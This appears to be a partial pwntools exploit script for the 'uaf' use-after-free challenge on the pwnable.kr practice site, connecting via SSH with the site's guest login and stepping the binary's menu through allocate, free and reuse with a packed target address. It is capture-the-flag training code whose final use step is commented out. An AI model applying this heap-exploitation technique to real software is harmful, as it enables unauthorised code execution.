from pwn import *
from sys import argv
import argparse
p = p32(0x401568)
print(p)
EXE_FILENAME = 'uaf'
EXE_ARGS=['8','/tmp/lolz']
PWNABLE_PASSWORD = 'guest'
PWNABLE_PORT = 2222
PWNABLE_HOST = 'pwnable.kr'


def parse_args():
	parser = argparse.ArgumentParser(
			    prog='Exploit for Pwnable.kr',
			    description='Exploit for Pwnable.kr',
			    )
	parser.add_argument('-d', '--debug', help='debug .exe with gdb', action='store_true')
	parser.add_argument('-l', '--local', help='local launch .exe', action='store_true')
	return parser.parse_args()

def main():
	p = None;
	args = parse_args()
	
	if args.local:
		p = process([EXE_FILENAME] +  EXE_ARGS)
	else:
		shell = ssh(EXE_FILENAME,PWNABLE_HOST,password=PWNABLE_PASSWORD, port=PWNABLE_PORT)
		p = shell.process(executable=EXE_FILENAME, argv=EXE_ARGS)
	print(p.recvline())
	print(p.recvline())
	print(p.recvline())
	#p.sendline('1\n3\n2\n1\n')
	print(f'sending 1')
	p.send('1\n')
	print(p.recvline())
	print(p.recvline())
	print(p.recvline())
	print(f'sending 3 (free)')
	p.send('3\n')
	print(p.recvline())
	print(p.recvline())
	print(p.recvline())
	print(f'sending 2 (after)')
	p.send('2\n')
	print(p.recvline())
	print(p.recvline())
	print(p.recvline())
	print(f'USING!')
	if args.debug:
		pid = gdb.attach(p)
#	p.send('1\n')
	#print(p.recvline())
	#print(p.recvline())

if __name__ == "__main__":
	main()
